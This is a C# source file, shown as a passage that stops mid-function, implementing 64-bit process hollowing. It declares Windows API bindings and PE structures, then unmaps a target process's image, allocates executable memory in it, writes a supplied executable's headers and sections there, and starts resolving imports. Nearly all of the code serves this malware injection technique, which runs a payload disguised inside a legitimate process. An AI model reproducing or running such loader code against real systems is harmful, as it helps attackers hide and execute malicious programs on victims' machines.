using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;


namespace process_hollowing
{
    class Program
    {

        #region defs

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }



        public enum MachineType : ushort
        {
            /// <summary>
            /// The content of this field is assumed to be applicable to any machine type
            /// </summary>
            Unknown = 0x0000,
            /// <summary>
            /// Intel 386 or later processors and compatible processors
            /// </summary>
            I386 = 0x014c,
            R3000 = 0x0162,
            /// <summary>
            ///  MIPS little endian
            /// </summary>
            R4000 = 0x0166,
            R10000 = 0x0168,
            /// <summary>
            /// MIPS little-endian WCE v2
            /// </summary>
            WCEMIPSV2 = 0x0169,
            /// <summary>
            /// Alpha AXP
            /// </summary>
            Alpha = 0x0184,
            /// <summary>
            /// Hitachi SH3
            /// </summary>
            SH3 = 0x01a2,
            /// <summary>
            /// Hitachi SH3 DSP
            /// </summary>
            SH3DSP = 0x01a3,
            /// <summary>
            /// Hitachi SH4
            /// </summary>
            SH4 = 0x01a6,
            /// <summary>
            /// Hitachi SH5
            /// </summary>
            SH5 = 0x01a8,
            /// <summary>
            /// ARM little endian
            /// </summary>
            ARM = 0x01c0,
            /// <summary>
            /// Thumb
            /// </summary>
            Thumb = 0x01c2,
            /// <summary>
            /// ARM Thumb-2 little endian
            /// </summary>
            ARMNT = 0x01c4,
            /// <summary>
            /// Matsushita AM33
            /// </summary>
            AM33 = 0x01d3,
            /// <summary>
            /// Power PC little endian
            /// </summary>
            PowerPC = 0x01f0,
            /// <summary>
            /// Power PC with floating point support
            /// </summary>
            PowerPCFP = 0x01f1,
            /// <summary>
            /// Intel Itanium processor family
            /// </summary>
            IA64 = 0x0200,
            /// <summary>
            /// MIPS16
            /// </summary>
            MIPS16 = 0x0266,
            /// <summary>
            /// Motorola 68000 series
            /// </summary>
            M68K = 0x0268,
            /// <summary>
            /// Alpha AXP 64-bit
            /// </summary>
            Alpha64 = 0x0284,
            /// <summary>
            /// MIPS with FPU
            /// </summary>
            MIPSFPU = 0x0366,
            /// <summary>
            /// MIPS16 with FPU
            /// </summary>
            MIPSFPU16 = 0x0466,
            /// <summary>
            /// EFI byte code
            /// </summary>
            EBC = 0x0ebc,
            /// <summary>
            /// RISC-V 32-bit address space
            /// </summary>
            RISCV32 = 0x5032,
            /// <summary>
            /// RISC-V 64-bit address space
            /// </summary>
            RISCV64 = 0x5064,
            /// <summary>
            /// RISC-V 128-bit address space
            /// </summary>
            RISCV128 = 0x5128,
            /// <summary>
            /// x64
            /// </summary>
            AMD64 = 0x8664,
            /// <summary>
            /// ARM64 little endian
            /// </summary>
            ARM64 = 0xaa64,
            /// <summary>
            /// LoongArch 32-bit processor family
            /// </summary>
            LoongArch32 = 0x6232,
            /// <summary>
            /// LoongArch 64-bit processor family
            /// </summary>
            LoongArch64 = 0x6264,
            /// <summary>
            /// Mitsubishi M32R little endian
            /// </summary>
            M32R = 0x9041
        }
        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }
        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }


        [StructLayout(LayoutKind.Explicit)]
        public unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)] public UInt32 VirtualSize;
            [FieldOffset(12)] public UInt32 VirtualAddress;
            [FieldOffset(16)] public UInt32 SizeOfRawData;
            [FieldOffset(20)] public UInt32 PointerToRawData;
            [FieldOffset(24)] public UInt32 PointerToRelocations;
            [FieldOffset(28)] public UInt32 PointerToLinenumbers;
            [FieldOffset(32)] public UInt16 NumberOfRelocations;
            [FieldOffset(34)] public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)] public UInt32 Characteristics;
            public string Section
            {

                get { return new string(Name); }
            }

        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_BASE_RELOCATION
        {
            [FieldOffset(0)]
            public UInt32 pagerva;

            [FieldOffset(4)]
            public UInt32 size;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            public UInt32 Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;




        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_IMPORT_DESCRIPTOR
        {
            [FieldOffset(0)]
            public uint Characteristics;

            [FieldOffset(0)]
            public uint OriginalFirstThunk;

            [FieldOffset(4)]
            public uint TimeDateStamp;

            [FieldOffset(8)]
            public uint ForwarderChain;

            [FieldOffset(12)]
            public uint Name;

            [FieldOffset(16)]
            public uint FirstThunk;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA32
        {
            [FieldOffset(0)]
            public uint ForwarderString;

            [FieldOffset(0)]
            public uint Function;

            [FieldOffset(0)]
            public uint Ordinal;

            [FieldOffset(0)]
            public uint AddressOfData;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA64
        {
            [FieldOffset(0)]
            public ulong ForwarderString;

            [FieldOffset(0)]
            public ulong Function;

            [FieldOffset(0)]
            public ulong Ordinal;

            [FieldOffset(0)]
            public ulong AddressOfData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_IMPORT_BY_NAME
        {

            public UInt16 Hint;
            public char Name;

        }


        [DllImport("Kernel32.dll")]
        public static extern int GetLastError();




        [DllImport("Kernel32.dll")]
        public static extern void CopyMemory(
            IntPtr destination,
            IntPtr source,
            int size
            );


        [DllImport("Kernel32.dll")]
        public static extern bool UnmapViewOfFile(IntPtr address);


        [DllImport("Kernel32.dll")]
        public static extern IntPtr MapViewOfFile(
            IntPtr hFileMappingObject,
            UInt32 dwDesiredAccess,
            UInt32 dwFileOffsetHigh,
            UInt32 dwFileOffsetLow,
            int dwNumberOfBytesToMap
            );


        [DllImport("Kernel32.dll")]
        public static extern IntPtr OpenFileMappingA(
            UInt32 dwDesiredAccess,
            [param: MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            string lpName
            );

        [DllImport("Kernel32.dll")]
        public static extern IntPtr CreateFileMappingA(
            IntPtr filehandle,
            IntPtr lpFileMappingAttributes,
            UInt32 flProtect,
            UInt32 dwMaximumSizeHigh,
            UInt32 dwMaximumSizeLow,
            string lpName
            );


        [DllImport("Kernel32.dll")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            int dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
            );


        [DllImport("Kernel32.dll")]
        public static extern bool VirtualFree(
            IntPtr lpAddress,
            int dwSize,
            UInt32 dwFreeType
            );

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetProcAddress(
            IntPtr handle,
            string functionname
            );

        [DllImport("Kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            ref uint lpThreadId);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
   UInt32 dwSize, uint flNewProtect, ref uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
         IntPtr hProcess,
         IntPtr lpBaseAddress,
         byte[] lpBuffer,
         Int32 nSize,
         ref UInt32 lpNumberOfBytesWritten
        );


        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
   IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
   IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);



        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
   uint dwSize, uint flAllocationType, uint flProtect);



        #endregion




        [StructLayout(LayoutKind.Sequential)]
        public  struct PROCESS_BASIC_INFORMATION
        {
            public int ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public int BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQueryInformationProcess(
            IntPtr processHandle,
            int processInformationClass,
             IntPtr processInformation, 
            uint processInformationLength, 
            ref uint returnLength);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 dwDesiredAccess,
            bool bInheritHandle,
            UInt32 dwProcessId
            );


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               out IntPtr lpNumberOfBytesRead);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProchandle, IntPtr baseAddr);


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr prochandle;
            public IntPtr threadhandle;
            public UInt32 processid;
            public UInt32 threadid;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }




        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }



        [DllImport("Kernel32.dll")]
        public static extern bool CreateProcessW(
            [param:MarshalAs(UnmanagedType.LPWStr)] string applicationname,
             [param: MarshalAs(UnmanagedType.LPWStr)] string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            UInt32 dwCreationFlags,
            IntPtr lpEnvironment,
             [param: MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory,
            ref StartupInfo lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
            );

        [DllImport("Kernel32.dll")]
        public static extern UInt32 ResumeThread(IntPtr threadhandle);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread,
            ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError= true)]
        public static extern bool SetThreadContext(IntPtr threadhandle, ref CONTEXT64 lpContext );
     

        public static string CheckBitVersion(byte[] rawfile)
        {
            string bit32 = "32bit";
            string bit64 = "64bit";


            byte[] dos = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];

            byte[] lfanew = new byte[4];
            for (int i = 0; i < 4; i++)
            {
                //Console.WriteLine(  dos[60 + i].ToString("X"));
                lfanew[i] = rawfile[60 + i];
            }

            int peheaderoffset = BitConverter.ToInt32(lfanew, 0);


            byte[] bitversion = new byte[2];
            bitversion[0] = rawfile[peheaderoffset + 4 + 20];
            bitversion[1] = rawfile[peheaderoffset + 4 + 20 + 1];

            string value = BitConverter.ToString(bitversion);
            if (value == "0B-01")
            {
                return bit32;
            }
            else if (value == "0B-02")
            {
                return bit64;
            }
            return bit32;

        }



        public static IntPtr GetProcessImageBase(IntPtr prochandle)
        {
            IntPtr imagebase = IntPtr.Zero;
            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));

            uint outlength = 0;
            int res = NtQueryInformationProcess(
                prochandle,
                0,
                pinfo,
               (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
               ref outlength
                );
         
            if (outlength > 0)
            {

                PROCESS_BASIC_INFORMATION pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pinfo, typeof(PROCESS_BASIC_INFORMATION));

                Console.WriteLine("peb address: {0}",pbi.PebAddress.ToString("X"));
                byte[] byteimagebase = new byte[8];
                IntPtr byteswritten = IntPtr.Zero;
                //0x8 0x12
                ReadProcessMemory(
                    prochandle,
                    pbi.PebAddress + 0x10,
                    byteimagebase,
                    8,
                    out byteswritten
                    ) ;

                Console.WriteLine("last error: {0}", GetLastError());

                imagebase = (IntPtr) BitConverter.ToInt64(byteimagebase,0);
                //Console.WriteLine(imagebase.ToString("X"));
                //Console.WriteLine("Image base: {0}", imagebase.ToString("X"));

                Marshal.FreeHGlobal(pinfo);
            }
            return imagebase;

        }
        
        
        public static int GetSizeofHeaders(byte[] rawfile)
        {
            int size = 0;

            byte[] lfanew = new byte[4];
            for (int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = rawfile[i + 60];
                //Console.WriteLine(lfanew[i].ToString("X2"));
            }

            int peoffset = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(peoffset);

            int sizeofheadersoffset = peoffset + 84;

            byte[] headerssize = new byte[4];
            for (int i = 0; i < headerssize.Length; i++)
            {
                headerssize[i] = rawfile[sizeofheadersoffset + i];
            }

            size = BitConverter.ToInt32(headerssize, 0);

            return size;
        }


        public static int GetImageSize(byte[] rawfile)
        {
            int size = 0;

            byte[] lfanew = new byte[4];
            for (int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = rawfile[i + 60];
                //Console.WriteLine(lfanew[i].ToString("X2"));
            }

            int peoffset = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(peoffset);

            int sizeofheadersoffset = peoffset + 80;

            byte[] headerssize = new byte[4];
            for (int i = 0; i < headerssize.Length; i++)
            {
                headerssize[i] = rawfile[sizeofheadersoffset + i];
            }

            size = BitConverter.ToInt32(headerssize, 0);

            return size;
        }


        public static void ProcessHollow64(IntPtr prochandle,byte[] rawfile,IntPtr remotebaseaddress,IntPtr threadhandle)
        {

            try
            {


                string bit = CheckBitVersion(rawfile);

                Console.WriteLine(bit);

                if (bit != "64bit")
                {
                    Environment.Exit(0);
                }



                int headerssize = GetSizeofHeaders(rawfile);

                int imagesize = GetImageSize(rawfile);

                IntPtr baseaddress = VirtualAlloc(IntPtr.Zero, imagesize, 0x00001000, 0x40);
                Marshal.Copy(rawfile, 0, baseaddress, headerssize);

                NtUnmapViewOfSection(prochandle, remotebaseaddress);

                remotebaseaddress = VirtualAllocEx(prochandle, remotebaseaddress, (uint)imagesize, 0x00001000| 0x00002000, 0x40);
                Console.WriteLine("Virtualallocex error: {0}",GetLastError());
                uint oldprotect = 0;
                VirtualProtectEx(prochandle, remotebaseaddress, (uint)imagesize, 0x40, ref oldprotect);

                Console.WriteLine("Local base address: {0}", baseaddress.ToString("X"));
                Console.WriteLine("Memory allocated at: {0}", remotebaseaddress.ToString("X2"));
                Console.WriteLine("Imagesize: {0}", imagesize.ToString("X"));


                #region parsing headers

                IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));

                IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();

                ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);

                ntheader.FileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 4, typeof(IMAGE_FILE_HEADER));

                ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 24, typeof(IMAGE_OPTIONAL_HEADER64));

                Console.WriteLine(ntheader.OptionalHeader.ImageBase.ToString("X2"));
                Console.WriteLine(ntheader.OptionalHeader.AddressOfEntryPoint.ToString("X2"));

                IMAGE_SECTION_HEADER[] sh = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];

                for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
                {

                    sh[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((baseaddress + dosheader.e_lfanew + 24 + Marshal.SizeOf(ntheader.OptionalHeader)) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER));
                    Console.WriteLine("Name: {0}", new string(sh[i].Name));
                    Console.WriteLine("Virtual Address: {0}", sh[i].VirtualAddress.ToString("X"));
                    Console.WriteLine("Raw offset: {0}", sh[i].PointerToRawData.ToString("X"));
                    Console.WriteLine("Size of raw data: {0}", sh[i].SizeOfRawData.ToString("X"));
                    Console.WriteLine("Virtual Size: {0}", sh[i].VirtualSize.ToString("X"));
                }


                #endregion

                byte[] headers = new byte[headerssize];
                Marshal.Copy(baseaddress, headers, 0, headers.Length);

                uint byteswritten = 0;
                WriteProcessMemory(prochandle, remotebaseaddress, headers, headers.Length, ref byteswritten);

                Console.WriteLine("Headers size written: {0}", byteswritten.ToString("X"));


                //mapping sections into remote memory

                for (int i = 0; i < sh.Length; i++)
                {
                    if (sh[i].SizeOfRawData > 0)
                    {
                        uint rawoffset = sh[i].PointerToRawData;
                        Console.WriteLine(rawoffset.ToString("X"));
                        byte[] temp = new byte[sh[i].VirtualSize];

                        for (int j = 0; j < temp.Length; j++)
                        {
                            temp[j] = rawfile[j + sh[i].PointerToRawData];
                            //Console.Write(temp[j].ToString("X")+",");
                        }
                        // Console.WriteLine((baseaddress + (int)sh[i].VirtualAddress).ToString("X"));
                        byteswritten = 0;
                        WriteProcessMemory(prochandle, remotebaseaddress + (int)sh[i].VirtualAddress, temp, temp.Length, ref byteswritten);
                        Console.WriteLine("section {0} with size {1} written", new string(sh[i].Name), byteswritten.ToString("X"));
                    }
                }

                List<IntPtr> handles = new List<IntPtr>();

                #region Fixing IATs
                //Console.WriteLine("import directory size: {0}", ntheader.OptionalHeader.ImportTable.Size);
                // fix IAT's only if import directory is not zero
                if (ntheader.OptionalHeader.ImportTable.Size > 0)
                {
                    IntPtr importptr = (IntPtr)baseaddress + (int)ntheader.OptionalHeader.ImportTable.VirtualAddress;



                    IMAGE_IMPORT_DESCRIPTOR firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                    while (firstimport.Name != 0)
                    {

                        string dllname = Marshal.PtrToStringAnsi(baseaddress + (int)firstimport.Name);
                        Console.WriteLine("Dll name: {0}", dllname);

                        IntPtr dllhandle = LoadLibrary(dllname);



